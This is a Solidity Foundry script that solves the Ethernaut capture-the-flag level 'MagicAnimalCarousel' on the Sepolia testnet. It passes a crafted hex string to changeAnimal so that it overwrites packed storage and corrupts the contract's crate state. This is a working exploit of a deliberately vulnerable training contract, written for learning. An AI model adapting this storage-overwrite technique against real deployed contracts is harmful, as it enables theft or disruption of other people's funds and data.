// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0 <=0.9.0;

import { console } from "@dev/forge-std/console.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { EthernautScript } from "./00_Ethernaut.s.sol";
import { MagicAnimalCarousel } from "contracts/CTF/Ethernaut/33_MagicAnimalCarousel.sol";
/*
forge script \
  foundry/script/CTF/Ethernaut/33_MagicAnimalCarousel.s.sol:MagicAnimalCarouselAttack \
  -f sepolia -vvvv \
  --broadcast

https://docs.soliditylang.org/en/latest/types.html
https://medium.com/@ynyesto/ethernaut-33-magical-animal-carousel-3aff78fe67be

*/

contract MagicAnimalCarouselAttack is EthernautScript {
    MagicAnimalCarousel private victimInst;

    function run() public broadcast {
        // 1.Setup
        console.log("MagicAnimalCarousel Before Attack player:", player);
        victimInst = MagicAnimalCarousel(0x998991Fde3F0D8741d13639a99DE318558C2E86d);
        console.log("Before Attack victimInst.currentCrateId():", victimInst.currentCrateId());
        // 2.Attack
        // ...
        // nextCrateId = currentCrateId
        victimInst.setAnimalAndSpin("Dog");
        string memory animal = string(abi.encodePacked(hex"10000000000000000000ffff"));
        victimInst.changeAnimal(animal, 1);
        victimInst.setAnimalAndSpin("Parrot");

        // 3Check
        // ...
        console.log("After Attack victimInst.currentCrateId():", victimInst.currentCrateId());
    }
}
